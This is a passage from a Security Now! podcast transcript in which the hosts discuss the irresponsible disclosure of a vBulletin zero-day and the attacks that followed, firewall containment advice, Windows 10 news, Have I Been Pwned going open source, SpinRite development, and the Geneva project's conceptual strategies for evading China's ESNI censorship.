He then concludes by offering what he describes as a short-term fix.  He says at the end of his posting:  "This fix will disable PHP widgets within your forums and may break some functionality" - he doesn't say so, but ads do break - "but will keep you safe from attacks until a patch is released by vBulletin," whom he did not inform of this.  So you go to vBulletin administrator control panel, click Settings in the menu on the left, then Options in the dropdown, choose General Settings, and then click Edit Settings.  Look for Disable PHP, Static HTML, and Ad Module rendering.  Set to Yes.  Click Save.



So what happened next?  Unfortunately, vBulletin sites are easy to locate with any Google search for the phrase "Powered by vBulletin."  And vBulletin is one of the more popular forum software systems.  It is in use by Electronic Arts, Zynga, Sony, Pearl Jam, NASA, Steam, and many more.  The attacks started almost immediately upon his publication.  Jeff Moss, who's known as "The Dark Tangent," perhaps best known as the creator of the Black Hat and Defcon security conferences, tweeted:  "A new vBulletin zero-day got dropped yesterday by @Zenofex that revealed the CVE-2019-16759 patch was incomplete.  Within three hours, forum.defcon.org was attacked, but we were ready for it," whatever that means.  He says:  "Disable PHP rendering to protect yourself until patched!"



Amir's reply to Jeff was "Thanks for the mention," though I'm sure Jeff would have preferred not to have his Defcon.org site attacked, if this had been done responsibly.  And around the same time Amir tweeted:  "Looks like the @vBulletin forums are currently down while they patch from the RCE vulnerability release.  Hopefully that means customers will also see a working patch soon."



Yeah, gee.  Or instead of being attacked by an irresponsibly disclosed zero-day, customers would probably have much preferred that he disclosed this quietly to vBulletin, who would certainly have taken it very seriously.  Last September's publication of the original zero-day, the fix for which I mentioned, or the fix for which this is a workaround, triggered a massive wave of vBulletin hacks which resulted in many companies disclosing security breaches through the months that followed.  Since Amir did disclose this vulnerability, it's clear that he didn't want to use it himself.  But the disconnect here seems to be that he won't mind at all if he enables, directly enables others to wreak havoc in his name.



And sure enough, yesterday we have a thread on the vBulletin support forum, the first one I found this morning.  "I received the scan results on my server that shows a URL - known exploit, fingerprint match, PHP shell exploit - indicating I have some type of issue.  It was recommended that I replace the web.php file."  Which, by the way, is not an official file on vBulletin.  That's something that somebody installed and then ran.  "That is fine, but I don't know what this file does or where another copy of it would be."



Yesterday at 7:27 a.m.:  "My site was also compromised this morning at 6:35 a.m. GMT-7.  The file is named 1.php and was placed in the root of the site.  Windows Defender identified the exploit as Backdoor:PHP/Shell.Q.  I've zipped up the file and attached here as Backdoor."



Yesterday, 11:15 a.m.:  "I got hacked at noon CST today.  Was on 5.6.1 Patch Level 1.  Have upgraded to 5.6.2.  Can provide HTTP access and error logs to Wayne Luke if you guys need help determining the attack vector."  Wayne works for Support at vBulletin.



And at 11:25 a.m.:  "We know the vector, and a patch is being developed.  Hopefully I can say more soon.  The only workaround I can say at this time is to make your vBulletin directory read-only (chmod 444)."  And of course that relates to we were talking about Linux directory privileges.  Turns out that remediation was found not to work because it blocked some access that was needed to the .htaccess file.



Yesterday at 11:44 a.m.:  "I found the files hax.php at these locations," and then two URLs.  Yesterday at 12:20 p.m.:  "My 5.6.1 site was hit, and I cannot access either URL.  I have 444'd it."  He says:  "My 5.6.2 sites appear unaffected."  Yesterday at 12:57 p.m.:  "Hi, is this the best place to be kept up to date about this issue?  Our 5.6.2 forum was hit as well today.  Is there a CVE number to track the issues yet?"  And then, finally, yesterday at 2:06 p.m.:  "Patches are available," and a link to the patches.



So this is not just theoretical.  When you loudly disclose a simple-to-execute remote code execution vulnerability like this, it hurts people.  I mean, it messes things up for people.  And so I'm at a loss to understand, like, what's in the mind of a person, especially who says, "Hey, Twitter, how would you like to hire me?"  Right.  Like Twitter's in the mood for that right now, after what they've just gone through.  So needless to say, anyone using v5 of vBulletin, that needs to have been patched last Sunday, two days ago.  Patch it now, if it hasn't been.



LEO:  Oh, geez.  Wow.



STEVE:  And to the common refrain that it's crucial to keep lines of communication open to the vendors of the software you're using, in other words, you'd like to have received this notice from vBulletin yesterday, I'll now add that this reality suggests that some level of compromise needs to be factored into any security-conscious organization.  It's similar to the fact that intrusion detection has now become an accepted part of an overall security posture.  Detecting an intrusion by preparing for it inherently acknowledges that there's going to be or might be an intruder to detect.  And that's never good.  But if there's going to be an intruder to detect, it's far better that it be detected than not.



We know that the proper way to think about security is that it is inherently porous.  I hate the truth of that, but we see if over and over and over.  You know, the adjective "porous" is the one I've adopted and used on the podcast because I think it perfectly says that the more pressure you put against security, the more likely it is that something will leak through.  You know, it's not absolute.  The sobering truth is that this means that systems must be made less brittle.  By that I mean that the event of a security breach should bend, but not break, an organization's security.  A practical example of this might be to recognize that PHP-based forum software has grown quite complex.  And we all know what that means.  With complexity comes risk.



So to mitigate the risk, software like PHP-based forums should be run on their own hardware behind a firewall such that even gaining root access on that machine, that firewall cannot be bypassed.  So not just a firewall running on the machine, but a firewall outside of that machine.  The typical forum only needs to have access to an organization's DNS and email servers.  I would argue that it should have its own local SQL database and not be reaching outside to the organization's shared SQL server.  There's a recipe, as an example, a recipe for disaster.  Containment in the event of a breach is the whole point.



And since DNS and email services exist at fixed addresses and only need a couple of ports, and they're comparatively benign if they've been set up right, a forum hosting machine's network connection should be placed behind a "deny any" external firewall that only makes exceptions to that "deny any" policy for a very few ports.  After all, this is the reason we call a firewall a firewall.  If anything catches fire and explodes on that machine, which in this case might be inevitable if it's hosting complex PHP-based forum software, at least the damage will be contained.



So in other words, think about what if, you know, pose "what if" scenarios and then ask where you can impose boundaries of containment so that your overall corporate security posture is flexible.  If something happens, okay, ouch.  But it didn't let somebody get out of a PHP forum onto your network, you know, execute code, get onto your network, and then set up a much more potent advanced persistent threat by then putting files up on a shared SQL server and going from there.  The world we live in today.



As for the world we don't yet live in today, DoH for Windows 10.  We don't talk much about Fast Ring and Slow Ring or the Release Preview Ring because even being on the "how do I get off this rollercoaster ring" provides sufficient excitement these days on Windows 10.  But those rings fascinate Paul, and especially Mary Jo, who talk about them all the time over on Windows Weekly.



And while we're on the subject of rings, I'll note that the paint is still wet on the renaming of those rings, to now refer to them as "channels."  That's the official new designation.  In order of decreasing excitement and increasing sanity and stability, we have the Dev Channel, the Beta Channel, and the Release Preview Channel.  Rings are gone.  We have channels now.



So as we know, and we talked about it in November, way back in November of 2018 Microsoft surprised us by announcing that Windows 10 would natively be getting encrypted DNS using DoH, DNS over HTTPS.  Apparently not DOT, but that's the way they, I mean, so they're like going the way everybody else has.  So that would mean that not just random browsers running on Windows but everything in the OS would get its DNS lookups encrypted.  This will actually happen for the first time when the Dev Channel - previously known as the Dev Ring, now the Dev Channel - gets the Windows 10 Insider Preview Build 20185, which is coming soon to a Dev Channel near you, if you like to live dangerously.



And as I said before, this early access news doesn't move me at all since I'm definitely happy staying right where I am, getting actual work done over in the "Won't you just please stop fussing  with it" channel.  But once this does migrate to the regular, okay, we're going to get this in an update through Windows 10 for the rest of us, we'll definitely be talking about it since its configuration details will probably be interesting, and I'm sure that a bunch of our listeners will have applications where it makes sense for their DNS to stay away from prying eyes.  You know, I'm on a Cox Cable connection.  Cox sees my lookups, but then they all go everywhere else from Cox's servers, and I have nothing of interest to Cox, so I'm not that worried about it.  But certainly I get it that a lot of people will be.



This is a really interesting story about Troy, Troy Hunt.  And it's too long for me to cover in the kind of detail that I wanted to.  But I'll give you enough of a taste of it.  I hope to whet your appetite because I gave it another - I gave the longest part of the story another shortcut to encourage people to go find it.  I titled this "Hasn't Been Pwned" because without success, it turns out that Troy Hunt has just concluded a yearlong search for someone to purchase or maybe merge with his very popular and very useful "Have I Been Pwned" site.



Have I Been Pwned is really a much bigger deal than it might seem from the outside.  For example, in his posting of March this year, following 10 months of work to find a partner, he noted:  "A lot happens in 11 months.  I onboarded five new governments onto HIBP:  Austria, Ireland, Norway, Switzerland, and Denmark," he says, "and a sixth one about to be announced any day now.  I loaded 77 new data breaches comprising 1.7B records into Have I Been Pwned and signed up almost 400,000 more individual subscribers to the service."  Holy crap.  He says:  "I built and launched the authenticated API and payment process.  I really should have done this earlier.  I'm so happy with it."



So, yeah, there's a lot there.  And as I said, he posted the story of his 11-month quest back in March.  It is really and truly a fantastic read.  He describes the insanity of endless meetings and notes the processes' bizarre similarity to many of our much-loved episodes of "Silicon Valley."  And he, like, you know, really talks about it in some detail.  There were hundreds of initial candidates which he went through a screening process and a successive weaning process over with NDAs and due diligences and all kinds of stuff.  And if we didn't have way too much else to get to, I would read it into the podcast.  But since I really believe it's worthwhile, I've given it, as I said, a GRC shortcut, grc.sc/troy.  You really should check it out if you have a chance, grc.sc/troy.  I think all of our listeners would find it really interesting.



So that was as of March of this year.  Troy began the wrap-up of that post by writing:  "So, what's next for HIBP and for me?"  He says:  "To be honest, I need time to recover.  What I've explained in this post will never adequately illustrate just how stressful this process was.  I need some time where I'm not waking up dreading how much work will have landed in my inbox overnight.  I need some time to write more code and more blog posts, two things that remain my passion but had to take a back seat during this process.  I'll still keep running Have I Been Pwned as I always have, but I need the head space to get my energy levels back up and plan the next phase."



He says:  "I've almost entirely cleared my calendar for the next few months" - and consider that this was in March of this year, so we know what was going on in March - "to give me that much-needed time out.  And with coronavirus causing a heap of conferences to be canceled and travel plans to be disrupted, it's probably not a bad time to stay home anyway."



And that brings us to today, and Troy's posting just last Friday.  I have a link to the most recent blog posting.  And he starts out:  "Let me just cut straight to it.  I'm going to open source the Have I Been Pwned code base.  The decision has been a while coming, and it took a failed M&A process" - that's what he called his Mergers & Acquisition process - "to get here, but the code will be turned over to the public for the betterment of the project and, frankly, for the betterment of everyone who uses it.  Let me explain why and how."  And he goes on.



And again, it's useful to read that.  I've got a link in the show notes.  And I'm struck again wishing I could share his detailed description of his plans for Have I Been Pwned.  But at least the gist of it is clear.  Have I Been Pwned will become a major and significant open source project on GitHub so that Troy is no longer carrying the entire burden of moving it forward himself.  It's clear that there's huge enthusiasm for the features offered by the system.  And Troy's approach has always been to be entirely open and transparent anyway.  So, I mean, it just seems like a good fit and the natural next step.  We'll certainly be keeping an eye on it.  So the news here is Have I Been Pwned is going to GitHub and open source, and will be open to contributions and code from people other than just Troy himself.



A couple little bits of miscellany.  I did have an opportunity to try Bloatbox, which was that GitHub-hosted Windows 10 debloating software that I had referred to before.  And it again unimpresses.  I have not yet found any app for debloating Windows 10 that does the job.  And I'm still refusing to be dissuaded or, well, yeah, distracted from SpinRite.  Nothing is pulling me from that.  Other people can write a Windows 10 debloater.  It doesn't need me.  So I will keep looking for someone to point me to one, and one that I can recommend.  But we still don't have it.



The Security Now! Shortcut of the Week.  I've already talked about a couple shortcuts I assigned to specific things.  This is the Shortcut of the Week.  So it's numbered this podcast, grc.sc/779.  It will take you to a page on BleepingComputer which I just sort of thought was worth sharing, mostly for the last of the seven.  It's titled "Useful Registry Hacks to Optimize Your Windows 10 Experience."



The first one is disabling Bing search in Windows search.  It says:  "Windows Search comes with the Bing search engine integration, and it allows you to find the content on Bing when the local search fails to find anything.  If you don't like Bing due to privacy or performance issues or if it's causing problems, you can disable it via the registry."  And so BleepingComputer has a link to show you how.  Also, disabling the Windows 10 lock screen is the second one.



Number three:  Add 'open command window here' to the File Explorer context menu.  I like that, actually.  And as a command line user I've used that extensively in previous versions of Windows.  This allows you to get it back if you, too, miss it in Windows 10.



If for some reason you wanted to display seconds on the taskbar clock, there's a way to do that.  I don't need that, but maybe someone would like it.  This one, though, the last one, I thought, that's interesting.  Just because why not?  Enable verbose mode in Windows 10.  It reads:  "With a tweak to the registry, you can boot your Windows 10 PC into Verbose Mode and get more detailed information, which is extremely helpful when troubleshooting problems."  It explains:  "This mode will display the specific step the operating system is on while booting up and shutting down Windows 10.  This mode allows you to troubleshoot startup and shutdown issues to see the specific steps that are being performed when a problem occurs."



And, you know, you get that spinning rollercoaster dot thing, and it's like, I would like to know what it's doing.  So I turned it on, and it tells you after you make the setting reboot.  I rebooted my Windows 10 machine, my main workstation, and it showed and stalled at stopping a specific service.  And sure enough, I had been wondering why my Windows 10 shutdown had been taking so long.  It doesn't tell you.  It immediately told me the service that it was stalled on trying to shut down.  And I thought, I'm not using that anymore.  So I disabled it, and now my Windows 10 shutdown went back to its normal speed.



So just a tip.  I really like that one.  Again, grc.sc/779 will take you to the BleepingComputer page with these links.  The last one shows you that it's just a registry.  You add a DWORD, set it to one, deep down in some policies somewhere.  And now Windows 10 tells you what it's doing, which is, like, why not?



Also just a little bit of closing the loop.  Someone who calls himself StarKiss tweeted from @StarKissedOne.  He said:  "Thanks for mentioning QNAP in the last Security Now!."  Remember we talked about the horrible problem, 68,000 I think it was, publicly accessible QNAP servers, many of which are insecure and located in the U.S.  He says:  "Found that my firmware was >4 revisions out of date.  Got absolutely no notifications.  Love the podcast."  So I'm certainly glad that our mention of this problem with QNAP did reach some people who needed it.  And this, again, in this day and age, nothing more important than assuring that you have lines of open communication to the software vendors of all the stuff you use.



A quick little bit on where I am with SpinRite.  We're down to the point now of finding and fixing obscure problems.  Somebody had a Kingston SSD on an Acer Aspire that was causing problems.  I had two SSDs, an OCZ and a something else, that were having problems.  It turns out that they did not like transferring 65,536 sectors at a time.  And it turns out I had discovered this seven years ago, in 2013, written adaptive code for it, and forgotten about it.  Although when I discovered it, they would only go up to 65,528, that is, eight sectors shy of the maximum.  That number was haunting because I thought, I remember something about this.



Anyway, it turns out that cutting the transfer in half to 32K sectors, and thus 16MB transfers, solved the compatibility problems across the board.  And because that still takes much longer than it does for me to queue up the next transfer, nothing is lost in performance, and we only gain in compatibility.  There was somebody else had a drive where it was in really bad shape, and it kept basically going offline and losing its link layer connectivity.  What was bizarre was it works well, or at least appears to, under Windows.  So it wasn't causing any obvious problems.  But the benchmark would refuse to complete because the drive was just losing its SATA link.  So I ended up over a course of three iterations of test releases developing a, like, almost infinite forgivability of this drive.



And I said to the guy, I said, look, you've got to open your laptop, unplug your SSD, and plug it in again because it's got a bad connector.  But don't do it until I add software to fix this in software because I want to still be able to run with it the way it is, as bad as it is.  And what this means is that SpinRite will be able to notify its users when it detects problems like this because actually we've run across a few others that are having a similar problem.  So it looks like it's somewhat common in SATA connections because they really do, you know, we're talking about, what is it, 6Gbps serial link.  So it's a finicky link.  And SpinRite will be able to diagnose link problems separate from media-related problems and tell its user, you know, we could run if we really had to, but you really ought to fix the connection to your SSD and then try again, and we'll let you know...



LEO:  That would be so helpful.



STEVE:  ...if you've got it fixed, yeah.



LEO:  So you could tell, it's a different signature if it's a bad cable than if it's something wrong with the drive?



STEVE:  Yeah.  What actually happens is that, I mean, there's lots of error bits.  And there were, like, three different  error conditions.  In order to squeeze the data across the serial link, there's actually - you don't put the 8-bit data on the link because the link is self-clocking.  And so if you had, like, eight bits of zeroes, you wouldn't get any clocking information for too long a period of time.



LEO:  Right.



STEVE:  So the eight bits are turned into 10 bits, and there's a fancy translation table that maps every byte into 10 bits.  That guarantees that you've got a few clock interval switches that occur often enough for this thing not to lose clock lock.  So that's one thing that can happen, and there are two other problems.  There's also a CRC on the link.  You can get a CRC link failure and then a different loss of framing.  So my benchmark - because really the benchmark is sort of a test platform for the driver.  So the driver keeps getting more and more sophisticated in order to deal with what we're actually finding in the field as a consequence of all...



LEO:  [Crosstalk].



STEVE:  Exactly, a consequence of all these tests.  And for a few brief hours Sunday afternoon there were no known problems with the AHCI driver code.  But then yesterday a new problem with a Samsung 860 EVO on an AMD chipset appeared, and the problem appears to be the way I'm resetting the SATA port.  So it turns out different chipsets want it to be done differently.  So I may need to make my port resetting logic a little more heuristic than it currently is.  But this is the way the sausage is made.  What this iterative painstaking process will eventually produce is what everyone wants, a single AHCI driver for SpinRite that's smart enough to work on every machine and drive it will ever encounter, and to provide you with information that Windows and other OSes were hiding from you.



LEO:  Yeah.  Very useful.



STEVE:  So we're getting there.



LEO:  It makes sense you have to distinguish between bad data and a bad cable.  That makes perfect sense.



STEVE:  Yes.



LEO:  Yeah, bad connection.  Now it's time to talk Geneva.



STEVE:  So this is really interesting.  China's Great Firewall tightens.  A few weeks ago, China added a rule to block one of TLS 1.3's new privacy-enhancing features, ESNI (Encrypted Server Name Indication).  Remember that once upon a time a single IP address could only be bound to a single web server certificate.  When any client connected, a browser, the web server listening at that IP's port would respond with a certificate for the domain that was associated with that IP.  This prevented the practice that is now very common and crucial, especially for IPv4, known as "multiple hosting."  Multiple hosting allows multiple separate domains to all point to the same single IP. But for that to work, the client, typically a web browser, must somehow indicate from which among multiple possible domains at that IP it wishes to be served.



So an extension was added to SSL to allow the client's SSL hello handshake packet to make that specification clear.  The web server answering at that IP would inspect the client's incoming SSL hello packet if it was in possession of a valid web certificate matching the domain the client was requesting in that hello packet.  The web server would select that certificate for the subsequent SSL negotiation and would also remember which website to serve to the client when it then made its first URL request.



From a privacy standpoint, the trouble with this is that the so-called SNI (Server Name Indication) necessarily had to be provided to the server right upfront before the SSL connection's privacy encryption could be established.  So that allowed any passive eavesdropper to easily determine to which domain this pending SSL connection was being directed.  And one could imagine, if you were China running the Great Firewall, you would be interested in secure connections coming up and to which domains they are going to.



But this overt lack of privacy drove those evolving the TLS standard to work out a means, which is present now in TLS 1.3, of adding encryption to the SNI extension to create ESNI (Encrypted Server Name Indication).  This is good for user privacy, but of course it's a bane for anyone having any anti-privacy agenda such as presumably the Chinese state, which we know has a manifest interest in controlling and censoring what its citizens are allowed to and able to access.



Since adoption of new standards is notoriously slow, this wasn't initially a problem for China.  But as TLS 1.3 usage has continued to grow, the growing usage of ESNI as a feature of TLS 1.3 had been giving Chinese censors some headaches.  I have a chart in the show notes which is encouraging.  This shows, as of  the beginning of 2018, so 2.5 years, where the various SSLs and TLSes are.  And where we are now, the bottom two lines today, SSL 2 and SSL 3, are - looks like less than maybe 10% SSL 3, but steadily dropping.  TLS 1.2 is on the rise.  1.1 is dropping.  1.0 is dropping.  And 1.3 is also on the rise.  So looks like TLS is almost at 100% support.  And TLS 1.3 is currently at nearly one third, 31.7%.  So definitely on the rise.  And that means that nearly a third of connections with clients supporting it at the client end and servers supporting it at the server end would be blinding the Chinese firewall to who they're connecting to.



And as I noted at the top, it turns out that China has reacted just recently, two weeks ago, with a bit of a heavy hand, by simply blocking any TLS 1.3 connections which use ESNI.  Other HTTPS traffic is still allowed through the Great Firewall, if it uses an older version of TLS or non-encrypted SNI.  And it's unclear what China expects to have happen.  TLS 1.3 and ESNI are here to stay, but perhaps not in China.  Maybe browsers will add a feature to turn off encrypted ESNI and just fall back to SNI, which would still give you the other benefits of 1.3, but allow China to eavesdrop.



I found an entry in the IETF list archive dated from just a couple weeks ago, July 30th.  It was titled in brackets "[TLS]" and then it said "Possible blocking of encrypted SNI extension in China."  And the posting said:  "The Great Firewall of China may have identified and blocked Cloudflare's ESNI implementation."  The poster said:  "I have found that when using a TLS client hello with ESNI extension to connect to server behind Cloudflare's CDN, the connection will be cut off after the whole TLS handshake is done.  And then that IP address will be blocked at the TCP level for several minutes."



Some additional probing of the phenomenon revealed that the detector is not merely matching on the lack of plaintext SNI.  It is specifically looking for the ESNI extension identified by the identifier that's in hex, so 0xFFCE.  Also the encrypted server name extension must be syntactically correct.  So it's actually parsing the extension.  This poster wrote:  "The detector is not just looking for the byte pattern FFCE."  And of course we know that's good since no one wants false positive triggering of the Great Firewall's block on this.  Actually, no one wants any triggering of the Great Firewall's block.  He said:  "Once an ESNI-containing client hello is detected, the firewall drops packets in the client-to-server direction for between 120 to 180 seconds," so one or two minutes.  And he says the detector, that is, this block, is running on all TCP ports, not just 443.



And it's already known that most functions of the Great Firewall work bidirectionally, and this new ESNI detection and blocking does, too.  Sending an ESNI-containing client hello from outside China to a server inside also results in temporary blocking.  And this of course is convenient since it allows for external experimentation probing with inbound connection packets.  And this brings us to GENEVA, which is the acronym for GENetic EVAsion.



A web browser's access to the domain https://censorship.ai redirects its visitor to https://geneva.cs.umd.edu, umd.edu being the University of Maryland.  "CS" obviously is comp sci, and Geneva is the project within the computer sciences department at University of Maryland.  It is an experimental genetic algorithm that attempts to discover, and I should say successfully, but we'll just say "attempts to discover," how to evade censorship by manipulating the packet stream on one end of the connection to confuse the censor.



Geneva consists of two components, its genetic algorithm and its strategy engine.  The strategy engine runs a given censorship evasion strategy using active network traffic.  The genetic algorithm is the learning component that evolves new strategies using the engine against a given censor.  Being a genetic algorithm inspired by biology, and just as biological systems compose simple building blocks - in the case of our DNA A, T, C, and G - Geneva generates new algorithms by compositing just a few simple ways of manipulating packets.  Specifically, it can duplicate, tamper, drop, or fragment packets.  Geneva composes these individual actions into action trees.  Action trees have a trigger.  This controls which packets the action trees act upon, and together these action trees form censorship evasion strategies.



Geneva initially creates many random individual strategies and runs each of them against real censors.  Based on how successful they are and other factors, it assigns a numerical fitness to each individual strategy.  The most fit survive from one generation to the next, and Geneva mutates and mates strategies to create new ones.  The key to Geneva's success is its fitness function, which encourages the genetic algorithm to explore the space of strategies that does not damage the underlying TCP connection because of course we want connections to still work.  Over many successive generations, if Geneva discovers a strategy that defeats censorship, the fitness function encourages the genetic algorithm to refine and simplify the strategy.



So one way to think of this is to compare it with fuzzing, which we've talked about often.  In fuzzing, we generate entirely random junk within the limits of the target API's parameters, and we just throw it at the target to see what happens.  So Geneva's a bit like that, but it adds memory and much more goal direction choosing for successive strategies.  And unlike previous work of this sort, censorship evasion strategies are not manually created.  Geneva discovers them automatically.  Once Geneva has discovered a means of evading censorship, only then is that means analyzed manually to learn more about how the censor operates.



In this case, the work has led to interesting insights like how China's Great Firewall synchronizes its state, or how it processes packets.  Sometimes the analysis concludes that Geneva has discovered a bug in the censor.  An example is the segmentation species Geneva discovered in China against the Great Firewall by segmenting the forbidden request twice at specific indices.  Though the Great Firewall can normally reassemble segments, by segmenting twice at these specific bounds, the sometimes less than Great Firewall can be tricked into ignoring the request to evade censorship.



As it turns out, this whole scheme actually works.  Geneva has been deployed against real-world censors in China, India, Iran, and Kazakhstan.  It has independently discovered dozens of strategies to defeat their censorship and found previously unknown bugs in censors.  And what's more, all of these strategies and Geneva's strategy engine are open source on GitHub.  And four days ago the ESNI plugin was added to the repository.  I have a link to the repository in the show notes.



In the case of China's ESNI-triggered blocking, they trained Geneva over the span of two days, 48 hours, both client-side and server-side.  They discovered six strategies to defeat the ESNI censorship, four which worked from the server's end, and six (including those four) which worked from the client.  And they are wacky stuff that wouldn't ever occur to someone; okay?  I have the first two, just because they were really interesting.



Strategy one that was discovered was the "Triple SYN."  It operates by initiating the TCP three-way handshake with three SYN packets such that the sequence number of the third SYN is corrupted.  Who would ever think of trying that?  This strategy performs what they called a "desynchronization attack" against the Great Firewall.  The Great Firewall synchronizes on the correct sequence number, so it misses the ESNI request.  It can also be applied on the server side.  This means that citizens inside China could successfully connect to secure and private services operating outside China, if those services added this wacky triple SYN hack to the server.  And they might only do this for client IPs originating from China.



The second example of a different strategy they called the "Four-Byte Segmentation."  The client sends the ESNI request across two TCP segments such that the first TCP segment is less than or equal to four bytes.  This is not the first time Geneva has discovered segmentation strategies, but it's surprising this strategy works in China.  The Great Firewall has been famous for its ability to reassemble TCP segments for almost a decade.  The TLS header is five bytes long; so by segmenting specifically the TLS header across multiple packets, they hypothesize that this breaks the Great Firewall's ability to protocol fingerprint ESNI packets as being TLS.



This has interesting implications for how the Great Firewall fingerprints connections.  It suggests the component of the Great Firewall that performs connection fingerprinting cannot reassemble TCP segments for all protocols.  And they decided that this theory was supported by other segmentation-based strategies identified by Geneva in the past.  So like the first strategy, this can also be triggered server-side because, by reducing the TCP window size during the three-way handshake, the server can force the client to segment their own request, which is actually a very clever hack.



And their report on how this all works goes on like that.  I have a link documenting the entire suite of censorship bypass strategies in the show notes for anyone who's interested.  And of course it's true.  This is a cat-and-mouse game, very much like the virus-and-antivirus game.  China could, and eventually I'm sure will, respond with fixes for the problems that Geneva has found, especially since the entire effort is open and public.  It's on GitHub.  And maybe after that, additional ways or new ways will be found around filtering.



But I think the larger implication here is for the application of this sort of AI-ish directed discovery being applied to software vulnerabilities, not just communications vulnerabilities.  I drew the analogy earlier to fuzzing.  We might call random fuzzing "dumb fuzzing," which begs the question, could we make fuzzing much smarter and more effective by adding a layer of goal-directed AI to the process?  Which I guess would bring us smart fuzzing, or maybe "super fuzz."  And we might get more security as a result.  But it does look like we're beginning to see more and more AI-style concepts being employed to security.  And that's all for the good.



LEO:  It's kind of interesting.  So basically it picks its strategies at random.



STEVE:  Yup.



LEO:  And just keeps trying and trying and trying till something works.



STEVE:  Yes, exactly.  And then it finds something, and then it tweaks it to see if it works better or worse, to see if it's able to improve the way it works.  And it may mate that with some other things, and it might get something even better.  And it may mutate them to see if it gets something better.  So, I mean, it is doing sort of a success-directed walk.  



LEO:  It's like a breveWalker.



STEVE:  Exactly.



LEO:  It learns how to attack and gets better.



STEVE:  Yup.



LEO:  You know, honestly, using this to attack the Great Firewall of China is going to have, I think, limited success.  Mostly what they're doing is helping patch it, frankly.



STEVE:  Yes.



LEO:  Mostly what they're doing is pen testing on behalf of the Chinese government because...



STEVE:  And nothing prevents, since this is on GitHub, nothing prevents the Chinese government...



LEO:  Doing it themselves.



STEVE:  ...running it themselves and looking at the things it finds.



LEO:  Right.  Actually, what really is intriguing about this in the long run is imagine as these get smarter and smarter, these are little agents, and they're - it's completely autonomous, Steve?  Or semi-autonomous?  



STEVE:  No, it's autonomous.



LEO:  It's completely autonomous.



STEVE:  Yup.



LEO:  I think this is a terrible idea.  I can just imagine these things going around, looking for vulnerabilities all the time.



STEVE:  Yeah.



LEO:  How do you stop it?



STEVE:  Yeah.  You can imagine, had you aimed this at port 3389, the famous Microsoft RDP port, it would have just poked at it until it found a way in and then gone, hey, found a way in.



LEO:  Found a way in.  The good news, it doesn't have a payload.  It doesn't do anything.  Does it report back?  Who does it report to?



STEVE:  Yeah.  If it were a malicious agent, definitely it would report.



LEO:  You would say, hey, if you find something, let me know.



STEVE:  It would phone home and say, hey, I found a gene that worked.



LEO:  I think we're going to look back on this and say, shoot.  This may be, I mean, it was going to happen.  There's nothing you can do to stop it.  I'm not convinced this is, first of all, it's not going to, honestly, it's not going to take ESNI down because it's just going to find the flaws, and they'll get patched.  It's going to make it better, not worse.



STEVE:  Yup.



LEO:  And in the long run this could be a genetic experiment gone wild.  All right.  I'm not going to get sci-fi.



STEVE:  I hope that our future overlord masters are kind and benevolent, Leo.



LEO:  I hope these bots like us.  We like you, bots.  We really do.  That's Steve Gibson.  He brings us, see, he brings us, I mean, this show has a payload.  This show is loaded like one of them Kinder Eggs with a gooey inside that you just can't get enough of.  I'm sorry.  That's not a good description.  However, I do appreciate everything you do every week, coming up with these stories, talking about it, filling us in on the latest security news.



Steve Gibson, you'll find him at GRC.com.  That's where this thing he's working on, SpinRite - I'm going to say, Steve, this is your life's work.



STEVE:  Yeah.



LEO:  You've done many things, but this is your life's work.



STEVE:  It is.



LEO:  He's laboring away on it to create 6.1.  You can get 6.0 right now, guarantee yourself a free copy of 6.1 if you go to GRC.com and look for SpinRite, world's finest hard drive recovery and maintenance utility.  Soon to be, I mean, I really like the direction you're taking this, a diagnostic tool, as well, a really useful diagnostic tool. 



STEVE:  Yeah.  And you know, Leo, I forgot to mention it, but these slow spots, we're finding slow spots which are really - it really begs the question, why is it slow, and would this mean, for example, imagine a future high-res bitmap SpinRite that showed you the speed response across the surface of your mass storage, and then zeroed in on it and worked on fixing those areas that might be pre-failure.



LEO:  Fascinating.



STEVE:  So there's lots of interesting experimentation coming.



LEO:  Lots of ways to go with this.  It's a great life project, I have to say.  And I think you've got a ways to - I think you're going to be doing this.  I see a SpinRite X in your future.  I'm just saying, Steve.  GRC.com.  While you're there you can pick up 16Kb audio versions of this show for the bandwidth-impaired, 64Kb for those with ears.  You can get transcripts, for those with eyes who like to read along.  Actually that's really useful to get one or both of those so you can read and listen.  I think that's a great idea.  GRC.com.  Plus lots of great freebies.  It's a fun site just to browse around.



We have copies of the show at our website.  We don't do the 16Kb or the transcripts.  We've got 64Kb, yes, and video.  That's our unique slice of Security Now!.  That's all at TWiT.tv/sn.  You can watch us do the show every Tuesday, 1:30 Pacific if we're on time, which we rarely are; 4:30 Eastern; 2030 UTC.  You know, anytime you tune into TWiT.tv/live to those audio or video streams, something's going on.  Something interesting's going on.  Hang out.  You know, the show will be around in a bit.  TWiT.tv/live.



Subscriptions, of course, available on all the best podcast platforms, a couple of new ones coming soon.  But Stitcher, Slacker, Overcast, Pocket Casts, Google Podcasts, Apple Podcasts, you know the drill.  Find Security Now!.  Subscribe to it.  I strongly recommend it.  That way you'll have a copy the minute it's available, to listen to at your leisure.



Steve, have a safe week, have a great week, and we'll see you next time on Security Now!.



STEVE:  Thanks, Leo.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#780

DATE:		August 18, 2020

TITLE:		Microsoft's 0-Day Folly

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-780.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we discuss the "Achilles" Snapdragon DPS flaw affecting more than one billion Android Smartphones, last week's third-largest Patch Tuesday in history, Mozilla's sadly uncertain future, the other shoe dropping after the ransomware attack on Canon, the nature of the so-called "software glitch"  preventing California from accurately tallying Coronavirus lab test results, the significance of Microsoft's addition of their Control Flow Guard technology to the Rust and LLVM code bases, Threema's addition of video calling to their super-secure communications platform, a bit of closing-the-loop feedback, news of a SpinRite technology decision, and then we take a sad look at Microsoft's recent seeming unconscionable behavior with regard to the two zero-day vulnerabilities that were finally patched last week.



